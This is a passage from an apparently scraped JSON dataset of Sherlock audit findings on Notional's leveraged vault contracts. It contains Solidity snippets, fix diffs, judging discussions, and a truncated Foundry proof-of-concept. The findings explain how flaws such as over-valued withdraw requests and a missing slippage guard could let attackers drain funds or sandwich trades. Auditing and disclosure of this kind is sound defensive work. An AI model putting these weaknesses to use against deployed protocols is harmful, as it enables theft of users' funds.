Constants.EXCHANGE_RATE_PRECISION);\n+ (s.totalWithdraw * rate.toUint() * w.vaultShares * BORROW_PRECISION) / (s.totalVaultShares * Constants.EXCHANGE_RATE_PRECISION * REDEMPTION_PRECISION);\n```\n\n`BORROW_PRECISION` = 1e6 and `REDEMPTION_PRECISION` = 1e18.\n\nLet's redo the calculation to verify that the new formula works as intended:\n\n```solidity\n(s.totalWithdraw * rate.toUint() * w.vaultShares * BORROW_PRECISION) / (s.totalVaultShares * Constants.EXCHANGE_RATE_PRECISION * REDEMPTION_PRECISION);\n(100e18 * 10e18 * 5e8 * 1e6) / (10e8 * 1e18 * 1e18)\n500000000\n500e6\n```\n\nThe new formula returned  500 units of $BT$, which is correct.",
      "summary": "\nThis report discusses a bug found in the code for computing the valuation of vault shares. This bug allows malicious users to borrow more than the actual collateral value, draining assets from the protocol. The bug is caused by an incorrect formula used to calculate the value of a withdraw request in terms of the borrowed token. The code uses an incorrect exchange rate and does not account for the precision of the tokens. This results in an overinflated value for the withdraw request, allowing malicious users to steal assets. The report recommends updating the formula to account for the precision of the tokens.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Notional Leveraged Vaults: Pendle PT and Vault Incentives",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/60",
      "tags": [],
      "finders": [
        "blackhole",
        "xiaoming90",
        "nirohgo"
      ]
    },
    {
      "id": "35117",
      "title": "H-4: `EtherFiLib::_initiateWithdrawImpl` will revert because rebase tokens transfer 1-2 less wei",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/43 \n\n## Found by \nZeroTrust\n\n## Summary\n`EtherFiLib::_initiateWithdrawImpl` will revert because rebase tokens transfer 1-2 less wei\n## Vulnerability Detail\nThe protocol always assumes that the amount of tokens received is equal to the amount of tokens transferred.\nThis is not the case for rebasing tokens, such as stETH and eETH, because internally they transfer shares which generally results in the received amount of tokens being lower than the requested one by a couple of wei because of roundings: transferring 1e18 eETH tokens from A to B, will may result in B receiving 0.99999e18 eETH tokens.\n```javascript\nfunction _initiateWithdrawImpl(uint256 weETHToUnwrap) internal returns (uint256 requestId) {\n@>        uint256 eETHReceived = weETH.unwrap(weETHToUnwrap);\n        eETH.approve(address(LiquidityPool), eETHReceived);\n@>        return LiquidityPool.requestWithdraw(address(this), eETHReceived);\n    }\n```\n- 1 Unwraps weETHToUnwrap weETH, meaning Transfers eETHReceived of eETH from the weETH contract to this contract itself \n- 2 RequestWithdraw  eETHReceived, which will attempt to transfer eETHReceived from the contract to the Etherfi protocol\nBut the actual amount of eETH received may be eETHReceived - 1~2 wei.\n\nStep 2 will fail, because the contract doesn't have enough eETH. The issue lies in attempting to transfer eETHReceived of eETH in step 2 instead of wrapping the actual amount of tokens received.\n\n\n\n## Impact\nContract functionality DoS\n## Code Snippet\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/staking/protocols/EtherFi.sol#L24\n## Tool used\n\nManual Review\n\n## Recommendation\n```diff\nfunction _initiateWithdrawImpl(uint256 weETHToUnwrap) internal returns (uint256 requestId) {\n+       uint256 balanceBefore = eETH.balanceOf(address(this));\n        uint256 eETHReceived = weETH.unwrap(weETHToUnwrap);\n+       uint256 balanceAfter = eETH.balanceOf(address(this));\n-        eETH.approve(address(LiquidityPool), eETHReceived);\n-        return LiquidityPool.requestWithdraw(address(this), eETHReceived);\n+         eETH.approve(address(LiquidityPool), balanceAfter - balanceBefore);\n+        return LiquidityPool.requestWithdraw(address(this), balanceAfter - balanceBefore);\n    }\n```\n\n\n\n## Discussion\n\n**sherlock-admin2**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**0xmystery** commented:\n>  It concerns deposit(), NOT wrap/unwrap\n\n\n\n**ZeroTrust01**\n\nEscalate\nThis should be considered a valid issue.\n\n```javascript\nfunction unwrap(uint256 _weETHAmount) external returns (uint256) {\n        require(_weETHAmount > 0, \"Cannot unwrap a zero amount\");\n        uint256 eETHAmount = liquidityPool.amountForShare(_weETHAmount);\n        _burn(msg.sender, _weETHAmount);\n@>>        eETH.transfer(msg.sender, eETHAmount);\n        return eETHAmount;\n    }\n```\nThe weETH::unwrap() function includes a transfer operation, so this involves the transfer of rebase tokens in this contract. In the LiquidityPool.requestWithdraw function, rebase tokens are transferred out of this contract because internally they transfer shares, which generally results in the received amount of tokens being lower than the requested one by a couple of wei due to rounding, So it will revert.\n\nThis is exactly the same issue as the one confirmed in the contest a few weeks ago.\nhttps://github.com/sherlock-audit/2024-05-sophon-judging/issues/63\nhttps://github.com/sherlock-audit/2024-05-sophon-judging/issues/119\n\n**sherlock-admin3**\n\n> Escalate\n> This should be considered a valid issue.\n> \n> ```javascript\n> function unwrap(uint256 _weETHAmount) external returns (uint256) {\n>         require(_weETHAmount > 0, \"Cannot unwrap a zero amount\");\n>         uint256 eETHAmount = liquidityPool.amountForShare(_weETHAmount);\n>         _burn(msg.sender, _weETHAmount);\n> @>>        eETH.transfer(msg.sender, eETHAmount);\n>         return eETHAmount;\n>     }\n> ```\n> The weETH::unwrap() function includes a transfer operation, so this involves the transfer of rebase tokens in this contract. In the LiquidityPool.requestWithdraw function, rebase tokens are transferred out of this contract because internally they transfer shares, which generally results in the received amount of tokens being lower than the requested one by a couple of wei due to rounding, So it will revert.\n> \n> This is exactly the same issue as the one confirmed in the contest a few weeks ago.\n> https://github.com/sherlock-audit/2024-05-sophon-judging/issues/63\n> https://github.com/sherlock-audit/2024-05-sophon-judging/issues/119\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**mystery0x**\n\n> Escalate This should be considered a valid issue.\n> \n> ```js\n> function unwrap(uint256 _weETHAmount) external returns (uint256) {\n>         require(_weETHAmount > 0, \"Cannot unwrap a zero amount\");\n>         uint256 eETHAmount = liquidityPool.amountForShare(_weETHAmount);\n>         _burn(msg.sender, _weETHAmount);\n> @>>        eETH.transfer(msg.sender, eETHAmount);\n>         return eETHAmount;\n>     }\n> ```\n> \n> The weETH::unwrap() function includes a transfer operation, so this involves the transfer of rebase tokens in this contract. In the LiquidityPool.requestWithdraw function, rebase tokens are transferred out of this contract because internally they transfer shares, which generally results in the received amount of tokens being lower than the requested one by a couple of wei due to rounding, So it will revert.\n> \n> This is exactly the same issue as the one confirmed in the contest a few weeks ago. [sherlock-audit/2024-05-sophon-judging#63](https://github.com/sherlock-audit/2024-05-sophon-judging/issues/63) [sherlock-audit/2024-05-sophon-judging#119](https://github.com/sherlock-audit/2024-05-sophon-judging/issues/119)\n\nHere's the selected report for Sophon contest that's related to your finding on eETH:\n\nhttps://github.com/sherlock-audit/2024-05-sophon-judging/issues/4\n\nRead through the report carefully, and you will notice wrap/unwrap is always 1:1. It's deposit() that's causing the 1-2 wei issue which does not apply to your report context.\n\n**ZeroTrust01**\n\n> > Escalate This should be considered a valid issue.\n> > ```js\n> > function unwrap(uint256 _weETHAmount) external returns (uint256) {\n> >         require(_weETHAmount > 0, \"Cannot unwrap a zero amount\");\n> >         uint256 eETHAmount = liquidityPool.amountForShare(_weETHAmount);\n> >         _burn(msg.sender, _weETHAmount);\n> > @>>        eETH.transfer(msg.sender, eETHAmount);\n> >         return eETHAmount;\n> >     }\n> > ```\n> > \n> > \n> >     \n> >       \n> >     \n> > \n> >       \n> >     \n> > \n> >     \n> >   \n> > The weETH::unwrap() function includes a transfer operation, so this involves the transfer of rebase tokens in this contract. In the LiquidityPool.requestWithdraw function, rebase tokens are transferred out of this contract because internally they transfer shares, which generally results in the received amount of tokens being lower than the requested one by a couple of wei due to rounding, So it will revert.\n> > This is exactly the same issue as the one confirmed in the contest a few weeks ago. [sherlock-audit/2024-05-sophon-judging#63](https://github.com/sherlock-audit/2024-05-sophon-judging/issues/63) [sherlock-audit/2024-05-sophon-judging#119](https://github.com/sherlock-audit/2024-05-sophon-judging/issues/119)\n> \n> Here's the selected report for Sophon contest that's related to your finding on eETH:\n> \n> [sherlock-audit/2024-05-sophon-judging#4](https://github.com/sherlock-audit/2024-05-sophon-judging/issues/4)\n> \n> Read through the report carefully, and you will notice wrap/unwrap is always 1:1. It's deposit() that's causing the 1-2 wei issue which does not apply to your report context.\n\n\n\n![shenshu](https://github.com/user-attachments/assets/2e5d1f67-c6d7-4715-89fc-cc587b4c759c)\n\nYou mixed up the link I provided. I pointed out that this issue is exactly the same as **issue group 1** (in the picture), but your link is to issue group 2 (in the picture). I never said it was the same as issue group 2.\n\n**WangSecurity**\n\n@ZeroTrust01 could you provide the link to the eETH contract please, so I can see how they've implemented their transfer function with fees.\n\n**ZeroTrust01**\n\n> @ZeroTrust01 could you provide the link to the eETH contract please, so I can see how they've implemented their transfer function with fees.\n\n\nThis is the address of the eETH contract.\nhttps://etherscan.io/address/0x35fA164735182de50811E8e2E824cFb9B6118ac2\n\nThis issue is not about the transfer function with fees; **it is about rebase token transfer using shares.** If the transfer amount is 1e18, the received amount might be (1e18 - 1 wei).\n\nI learned this from a report where the issue was exactly the same as this one.\nhttps://github.com/sherlock-audit/2024-05-sophon-judging/issues/119\n\n**WangSecurity**\n\nThank you. For future reference, historical decisions are not sources of truth and each issue is different, so I would like to ask you instead of saying \"this issue is the exact same as in the previous contest\", prove that your issue is valid, regardless of other contests and decisions. Often it's the case that the same issue is valid in one contest, but invalid in an another.\n\nAbout the issue. Even though, Notional's code fetches the `eEthReceived` from `weEth.unwrap` the `eEthReceived` represents the amount before `eEth.transfer`. `eETH.transfer` makes a conversion from input amount to token shares and sends the amount of shares received, which can be lower due to precision loss. Later, this will revert since the contract tries to send `eEthreceived`.\n\nPlanning to accept the escalation and validate the report with high severity since it can happen on every withdrawal from EtherFi. @mystery0x @ZeroTrust01 are there any duplicates?\n\n**brakeless-wtp**\n\nI believe it is unique.\n\n**WangSecurity**\n\nResult:\nHigh\nUnique\n\n**sherlock-admin4**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [ZeroTrust01](https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/43/#issuecomment-2227151516): accepted",
      "summary": "\nSummary:\n\nThe report highlights a bug in the `EtherFiLib::_initiateWithdrawImpl` function, which can cause it to revert due to a transfer of 1-2 less wei when dealing with rebasing tokens. This is because the protocol assumes that the amount of tokens received is equal to the amount of tokens transferred, but with rebasing tokens, this is not always the case due to rounding. The impact of this bug is that it can cause a denial of service for the contract. The report recommends a code change to fix the issue and provides a code snippet for reference. The bug was found through manual review and it is recommended to escalate the issue for further consideration. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Notional Leveraged Vaults: Pendle PT and Vault Incentives",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/43",
      "tags": [],
      "finders": [
        "ZeroTrust"
      ]
    },
    {
      "id": "35116",
      "title": "H-3: Selling sUSDe is vulnerable to sandwich attack when staked token is DAI",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/18 \n\n## Found by \n0xrobsol, Ironsidesec, TopStar, ZeroTrust, aman, blackhole, chaduke, denzi\\_, lemonmon, yotov721\n## Summary\nThe protocol has functionality that makes a trade in 2 parts (legs). It only has slippage protection in the second part, but the second part is only executed in certain conditions, leaving the trade without slippage protection. \n\n## Vulnerability Detail\nThe protocol offers users the functionality to leverage stake and receive leveraged yield. This can be achieved by a **borrowed** token being wrapped or exchanged into a staking token that is pegged to the borrow token’s value.\n\nNote that the user may instead deposit the borrow token directly.\n\nOne of the tokens Notional uses is Ethena's `USDe` and `sUSDe`. The user would be receiving leveraged `USDe` yield. In the case of Ethena/Notional the borrowed token is DAI.\n\nOnce a user wants to exit `BaseStakingVault::_redeemFromNotional` is called. There are two options instant redemption or through the withdraw request functionality. If instant redemption is used `EthenaLib::_sellStakedUSDe` is called.\n```javascript\n    function _executeInstantRedemption(\n        address /* account */,\n        uint256 vaultShares,\n        uint256 /* maturity */,\n        RedeemParams memory params\n    ) internal override returns (uint256 borrowedCurrencyAmount) {\n        uint256 sUSDeToSell = getStakingTokensForVaultShare(vaultShares);\n\n        // Selling sUSDe requires special handling since most of the liquidity\n        // sits inside a sUSDe/sDAI pool on Curve.\n        return EthenaLib._sellStakedUSDe(\n            sUSDeToSell, BORROW_TOKEN, params.minPurchaseAmount, params.exchangeData, params.dexId\n        );\n    }\n```\n\nThe `_sellStakedUSDe` function has two trades. The first one swapping from `sUSDe` to `sDAI`. The second is only executed if the borrow token is NOT `DAI` as seen in the code snippet bellow.\n\n<details>\n\n```javascript\n    function _sellStakedUSDe(\n        uint256 sUSDeAmount,\n        address borrowToken,\n        uint256 minPurchaseAmount,\n        bytes memory exchangeData,\n        uint16 dexId\n    ) internal returns (uint256 borrowedCurrencyAmount) {\n        Trade memory sDAITrade = Trade({\n            tradeType: TradeType.EXACT_IN_SINGLE,\n            sellToken: address(sUSDe),\n            buyToken: address(sDAI),\n            amount: sUSDeAmount,\n            limit: 0, // NOTE: no slippage guard is set here, it is enforced in the second leg\n                      // of the trade.\n            deadline: block.timestamp,\n            exchangeData: abi.encode(CurveV2Adapter.CurveV2SingleData({\n                pool: 0x167478921b907422F8E88B43C4Af2B8BEa278d3A,\n                fromIndex: 1, // sUSDe\n                toIndex: 0 // sDAI\n            }))\n        });\n\n\n        (/* */, uint256 sDAIAmount) = sDAITrade._executeTrade(uint16(DexId.CURVE_V2));\n\n\n        // Unwraps the sDAI to DAI\n        uint256 daiAmount = sDAI.redeem(sDAIAmount, address(this), address(this));\n        \n=>      if (borrowToken != address(DAI)) {\n            Trade memory trade = Trade({\n                tradeType: TradeType.EXACT_IN_SINGLE,\n                sellToken: address(DAI),\n                buyToken: borrowToken,\n                amount: daiAmount,\n                limit: minPurchaseAmount,\n                deadline: block.timestamp,\n                exchangeData: exchangeData\n            });\n\n\n            // Trades the unwrapped DAI back to the given token.\n            (/* */, borrowedCurrencyAmount) = trade._executeTrade(dexId);\n        } else {\n            borrowedCurrencyAmount = daiAmount;\n        }\n    }\n``` \n\n</details>\n\nThere is NO slippage protection on the first trade. The reason being that slippage is checked in the second trade. \nHowever the second trade is only executed in the borrow token is NOT `DAI`. This opens the possibility of the trade being sandwich attacked by MEV bots stealing large portions of user funds, if the borrowed token is DAI, because the second trade would NOT be executed. Hence no slippage at all would be enforced in the transaction. \n\n## Impact\nLoss of funds due to sandwich attack \n\n## Code Snippet\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/14d3eaf0445c251c52c86ce88a84a3f5b9dfad94/leveraged-vaults-private/contracts/vaults/staking/protocols/Ethena.sol#L124-L167\n\n## Tool used\nManual Review\n\n## Recommendation\nAdd a slippage parameter to the first trade as well or use the `minPurchaseAmount` parameter as a minAmountOut:\n```diff\n    function _sellStakedUSDe(        \n        uint256 sUSDeAmount,\n        address borrowToken,\n        uint256 minPurchaseAmount,\n        bytes memory exchangeData,\n        uint16 dexId\n    ) {\n\n...\n\n        uint256 daiAmount = sDAI.redeem(sDAIAmount, address(this), address(this));\n\n        if (borrowToken != address(DAI)) {\n            Trade memory trade = Trade({\n                tradeType: TradeType.EXACT_IN_SINGLE,\n                sellToken: address(DAI),\n                buyToken: borrowToken,\n                amount: daiAmount,\n                limit: minPurchaseAmount,\n                deadline: block.timestamp,\n                exchangeData: exchangeData\n            });\n\n            // Trades the unwrapped DAI back to the given token.\n            (/* */, borrowedCurrencyAmount) = trade._executeTrade(dexId);\n        } else {\n            borrowedCurrencyAmount = daiAmount;\n+           require(borrowedCurrencyAmount >= minPurchaseAmount, \"NotEnoughtAmountOut\");\n        }\n    }\n```",
      "summary": "\nThis bug report discusses a vulnerability in a protocol that allows users to leverage stake and receive leveraged yield. The issue arises when a borrowed token is wrapped or exchanged into a staking token that is pegged to the borrow token's value. The vulnerability occurs when a user wants to exit the protocol and a certain function is called, which has two options for redemption. The first option involves a trade that does not have slippage protection, while the second option does have slippage protection but is only executed under certain conditions. This leaves the trade vulnerable to a sandwich attack, where MEV bots can steal a large portion of user funds if the borrowed token is DAI. The impact of this vulnerability is a loss of funds for users. The report recommends adding a slippage parameter to the first trade or using the `minPurchaseAmount` parameter as a minimum amount out to prevent this vulnerability. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Notional Leveraged Vaults: Pendle PT and Vault Incentives",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/18",
      "tags": [],
      "finders": [
        "lemonmon",
        "0xrobsol",
        "Ironsidesec",
        "aman",
        "TopStar",
        "denzi\\_",
        "ZeroTrust",
        "yotov721",
        "chaduke",
        "blackhole"
      ]
    },
    {
      "id": "35115",
      "title": "H-2: Lido withdraw limitation will brick the withdraw process in an edge case",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/14 \n\n## Found by \nnovaman33\n## Summary\nLido protocol has limitation regarding the requestWithdraw function. However some of these limitation have not been considered in the `_initiateWithdrawImpl` leading to users being unable to claim their vault shares even after the cooldown.\n## Vulnerability Detail\nLido has stated the following withdraw limitation in their docs:\n1. withdrawals must not be paused\n2. stETH balance of msg.sender must be greater than the sum of all _amounts\n3. there must be approval from the msg.sender to this contract address for the overall amount of stETH token transfer\n4. each amount in _amounts must be greater than MIN_STETH_WITHDRAWAL_AMOUNT and lower than MAX_STETH_WITHDRAWAL_AMOUNT (values that can be changed by the DAO)\nExtracted from here( https://docs.lido.fi/contracts/withdrawal-queue-erc721#requestwithdrawals )\n\n\nConsider the following scenario:\n 1) A user who has shares representing stETH less than the MIN_STETH_WITHDRAWAL_AMOUNT or more than the MAX_STETH_WITHDRAWAL_AMOUNT calls `initiateWithdraw`. The withdraw will be initiated successfully and the rsETH to withdraw will be sent to the holder contract which is going to start the cooldown.\n 2) However after the cooldown has passed the user will call the `triggerExtraStep` function which will always result in revert because of the Lido requirements regarding the amount to be withdrawn(mentioned in point 4). \n## Impact\nThe user will experience a full DOS of the protocol. They will have a pending withdraw that will never finish, which will result in their funds being locked forever. They will not be able to liquidate or deposit because of the pending withdraw. The function `triggerExtraStep` will always revert and the tokens from Kelp will never be claimed, because of Lido's limitation. - High\n## Code Snippet\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/14d3eaf0445c251c52c86ce88a84a3f5b9dfad94/leveraged-vaults-private/contracts/vaults/staking/protocols/Kelp.sol#L83\n## Tool used\n\nManual Review\n\n## Recommendation\nConsider enforcing withdraw limitations so that if a user has more than the MAX_STETH_WITHDRAWAL_AMOUNT split it on two requests, or create deposit limitations.\n\n\n\n## Discussion\n\n**sherlock-admin2**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**0xmystery** commented:\n>  Calls made by the Notional proxy (i.e. depositFromNotional and redeemFromNotional) are restricted by deposit sizes and maximum leverage ratios enforced by the main Notional contract\n\n\n\n**novaman33**\n\nEscalate,\nThis is a valid issue that will result in permanent lock of funds. \nThe way I understand your comment is that there can be deposit limitations, however I do not consider them to be relevant here as a user could simply deposit more than once or gain funds by liquidating others. Also these min and max values by the Lido protocol are changable by the DAO. The issue is that in the same function funds are pulled from Kelp and sent to Lido and these limitations will cause a revert of the whole function. I did review the code and I did not see any restrictions as you have stated. In case I am missing something could you provide a reference to the check you have considered in order to invalidate the issue?\n\n**sherlock-admin3**\n\n> Escalate,\n> This is a valid issue that will result in permanent lock of funds. \n> The way I understand your comment is that there can be deposit limitations, however I do not consider them to be relevant here as a user could simply deposit more than once or gain funds by liquidating others. Also these min and max values by the Lido protocol are changable by the DAO. The issue is that in the same function funds are pulled from Kelp and sent to Lido and these limitations will cause a revert of the whole function. I did review the code and I did not see any restrictions as you have stated. In case I am missing something could you provide a reference to the check you have considered in order to invalidate the issue?\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**mystery0x**\n\n> Escalate, This is a valid issue that will result in permanent lock of funds. The way I understand your comment is that there can be deposit limitations, however I do not consider them to be relevant here as a user could simply deposit more than once or gain funds by liquidating others. Also these min and max values by the Lido protocol are changable by the DAO. The issue is that in the same function funds are pulled from Kelp and sent to Lido and these limitations will cause a revert of the whole function. I did review the code and I did not see any restrictions as you have stated. In case I am missing something could you provide a reference to the check you have considered in order to invalidate the issue?\n\nIt's found in the contest `Details` page. These issues are commonly known and will be low at most for the suggested mitigation you provided.\n\n**novaman33**\n\n@mystery0x \nThere are no restriction regarding how much the user can deposit. The restrictions are so that the position is healthy and the leverage ratio is less than the maximum ratio. The issue is that if a user tries to withdraw less than 100 wei they will experience a full DOS since they will have a withdraw request that will be pending but will not be able to finalize it since the triggerExtraStep will always revert because of the lido limitation. \nThe other case however is much more scary. If a whale staker comes, and they have more than 1000ETH(which is the MAX_STETH_WITHDRAWAL_AMOUNT), when trying to withdraw this amount of money, triggerExtraStep will always revert, they will have a pending withdrawRequest meaning they will not be able to deposit or liquidate.\nWhile you did mention the contest page statement about the restrictions in deposit sizers I did review them and both cases are possible with these restrictions. I cannot agree that permanently locking funds(which will happen in both cases) and experiencing full DOS is a low severity case.\n\n**WangSecurity**\n\nThis is the `holder` contract, correct? https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/14d3eaf0445c251c52c86ce88a84a3f5b9dfad94/leveraged-vaults-private/contracts/vaults/staking/protocols/ClonedCoolDownHolder.sol\n\nIt has a rescue function to retrieve the tokens. Also, can you send a link to `initiateWithdraw`, there are several functions with similar names, want to understand what you talk about specifically.\n\n**novaman33**\n\n@WangSecurity, \nSo in order for a user to withdraw, they first call initiateWithdraw(BaseStakingVault.sol), which calls _initiateWithdraw(WithdrawRequestBase.sol), which than calls` _initiateWithdrawImpl`(this is from the Kelp.sol in this case). In `_initiateWithdrawImpl`(Kelp.sol), a holder contract is made and rsETH is transfered to the new holder address. Than holder.startColldown is called. `_startCooldown` transfers all the rsETH balance of the holder contract to Kelp and calls  `WithdrawManager.initiateWithdrawal(stETH, balance);`\nThe problem is in the `triggerExtraStep` function, where firstly the withdraw is completed from Kelp and then  `LidoWithdraw.requestWithdrawals(amounts, address(this));` is called, which has the limitations mentioned in this report. The main issue is that the holder contract has no other way to take the stETH tokens from Kelp, but only triggerExtraStep which will result in a revert in the forementioned edge cases. The rescueTokens function will not be able to retrieve those tokens because they are not stuck in the holder contract but are stuck in Kelp with no way to be claimed. The restrictions mentioned by the judge are from the readMe but they are not applicable in this case because they do not prevent users from withdrawing less than 100wei or more than 1000ETH. There are only leverage restrictions which are to keep positions healthy. These however are irrelevant in this specific case.\n\n**WangSecurity**\n\nThank you for that clarifications. For the scenario about minimum withdrawal I would consider low, since the loss if 100 wei. But for the maximum is completely viable. I believe the high severity is appropriate here, since it will affect every whale investor in Notional and causes complete loss of funds.\n\nPlanning to accept the escalation and validate with high severity. Are there any duplicates @novaman33 @mystery0x ?\n\n**novaman33**\n\n@WangSecurity  believe it is solo.\n\n**WangSecurity**\n\nResult:\nHigh \nUnique\n\n**sherlock-admin2**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [novaman33](https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/14/#issuecomment-2222897585): accepted",
      "summary": "\nThis bug report discusses an issue with the Lido protocol's requestWithdraw function. Due to limitations not being considered in the `_initiateWithdrawImpl` function, users may be unable to claim their vault shares even after the cooldown period. This could result in a permanent lock of funds and a denial of service for the user. The code snippet and discussion show that this is a valid issue with a high severity, as it affects all whale investors in the protocol. The recommended solution is to enforce withdraw limitations, such as splitting large requests into smaller ones. The report has been escalated and accepted with a high severity rating.",
      "quality_score": 4,
      "rarity_score": 4.333333333333333,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Notional Leveraged Vaults: Pendle PT and Vault Incentives",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/14",
      "tags": [],
      "finders": [
        "novaman33"
      ]
    },
    {
      "id": "35114",
      "title": "H-1: `_splitWithdrawRequest` will make invalid withdraw requests in an edge case",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/6 \n\n## Found by \nZeroTrust, aman, novaman33\n## Summary\nWhen an account is deleveraged, _splitWithdrawRequest is called so that pending withdraw requests of the account that is being liquidated are split between them and the liquidator. However when the account is being fully liquidated, the old withdraw request is deleted which creates an invalid Id for the liquidator's withdrawRequest.\n## Vulnerability Detail\nIn `_splitWithdrawRequest` the request of the from address is being read by storage:\n```solidity\n WithdrawRequest storage w = VaultStorage.getAccountWithdrawRequest()[_from];\n```\nThen the following check is made to delete the withdraw request of the from account if all the vault tokens are being taken from him:\n```solidity \n if (w.vaultShares == vaultShares) {\n            // If the resulting vault shares is zero, then delete the request. The _from account's\n            // withdraw request is fully transferred to _to\n            delete VaultStorage.getAccountWithdrawRequest()[_from];\n        } \n```\nHere the delete keyword is used to reset the withdraw request of the from account. However the `w` variable is still a pointer to this place in storage meaning that resetting VaultStorage.getAccountWithdrawRequest()[_from] will also be resetting `w`. As a result `w.requestId=0` and \n```solidity \ntoWithdraw.requestId = w.requestId;\n```\nHere the new requestId is equal to 0 which is the default value meaning that this withdraw request will not be recognized by `_finalizeWithdrawsManual` and the other finalize withdraw functions and all these vault shares will be lost. Also if `initiateWithdraw` is called the old vaultShares will be wiped out for the new shares to be withdrawn.\n## Impact\nLoss of vaut tokens for the liquidator.\n## Code Snippet\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/14d3eaf0445c251c52c86ce88a84a3f5b9dfad94/leveraged-vaults-private/contracts/vaults/common/WithdrawRequestBase.sol#L221\n## Tool used\n\nManual Review\n\n## Recommendation\nStore the requestId of the from address in another memory variable.\n\n\n\n## Discussion\n\n**sherlock-admin2**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**0xmystery** commented:\n>  w has been assigned and will not be reset\n\n\n\n**novaman33**\n\nEscalate,\nThis is a valid issue. w is a pointer and is being reset when mapping is deleted.\n\n**sherlock-admin3**\n\n> Escalate,\n> This is a valid issue. w is a pointer and is being reset when mapping is deleted.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**amankakar**\n\nThis Issue is dup of [#89](https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/89)\n\nYou can observe that there is no return or halt in the flow when a request is deleted. The same` requestID`, which has been deleted, retains its storage scope. Consequently, the `requestID` assigned to the new withdrawal request for the `liquidator` will always be zero in this scenario. This is a significant issue that could result in asset loss and needs to be reconsidered.\nFor proof, I have also added simple code demonstrating that the `requestID` will be 0 after deletion.\n\n**mystery0x**\n\n> This Issue is dup of [#89](https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/89)\n> \n> You can observe that there is no return or halt in the flow when a request is deleted. The same` requestID`, which has been deleted, retains its storage scope. Consequently, the `requestID` assigned to the new withdrawal request for the `liquidator` will always be zero in this scenario. This is a significant issue that could result in asset loss and needs to be reconsidered. For proof, I have also added simple code demonstrating that the `requestID` will be 0 after deletion.\n\nPlease provide a coded POC alleging your claim. I will also request the sponsors looking into your report.\n\n**novaman33**\n\n@mystery0x \n```solidity\n// SPDX-License-Identifier: UNLICENSED\n\npragma solidity 0.8.22;\n\nimport \"forge-std/Test.sol\";\n\nstruct WithdrawRequest {\n    uint256 requestId;\n    uint256 vaultShares;\n    bool hasSplit;\n}\ncontract TestRequestID is Test {\n    address alice = makeAddr(\"aLice\");\n    address bob = makeAddr(\"bob\");\n\n    struct SplitWithdrawRequest {\n        uint256 totalVaultShares; // uint64\n        uint256 totalWithdraw; // uint184?\n        bool finalized;\n    }\n\n    function setUp() external {}\n\n    uint256 public constant DISTRIBUTION_DIVISOR = 100 ether;\n\n    function testRequestId() external {\n        _createRequest();\n        _splitWithdrawRequest(address(alice), address(bob), 100);\n        WithdrawRequest storage w = VaultStorage.getAccountWithdrawRequest()[\n            bob\n        ];\n        assert(w.requestId == 0);\n    }\n\n    function _splitWithdrawRequest(\n        address _from,\n        address _to,\n        uint256 vaultShares\n    ) internal {\n        WithdrawRequest storage w = VaultStorage.getAccountWithdrawRequest()[\n            _from\n        ];\n        if (w.requestId == 0) return;\n        // @audit : Ingore this code as it does not have any impact in our case \n        // Create a new split withdraw request\n        // if (!w.hasSplit) {\n        //     SplitWithdrawRequest memory s = VaultStorage\n        //         .getSplitWithdrawRequest()[w.requestId];\n        //     // Safety check to ensure that the split withdraw request is not active, split withdraw\n        //     // requests are never deleted. This presumes that all withdraw request ids are unique.\n        //     require(s.finalized == false && s.totalVaultShares == 0);\n        //     VaultStorage\n        //     .getSplitWithdrawRequest()[w.requestId].totalVaultShares = w\n        //         .vaultShares;\n        // }\n\n        console.log(\"Request ID is Before Delete :\", w.requestId);\n\n        if (w.vaultShares == vaultShares) {\n            // If the resulting vault shares is zero, then delete the request. The _from account's\n            // withdraw request is fully transferred to _to\n            delete VaultStorage.getAccountWithdrawRequest()[_from];\n        } else {\n            // Otherwise deduct the vault shares\n            w.vaultShares = w.vaultShares - vaultShares;\n            w.hasSplit = true;\n        }\n\n        // Ensure that no withdraw request gets overridden, the _to account always receives their withdraw\n        // request in the account withdraw slot.\n        WithdrawRequest storage toWithdraw = VaultStorage\n            .getAccountWithdrawRequest()[_to];\n        require(\n            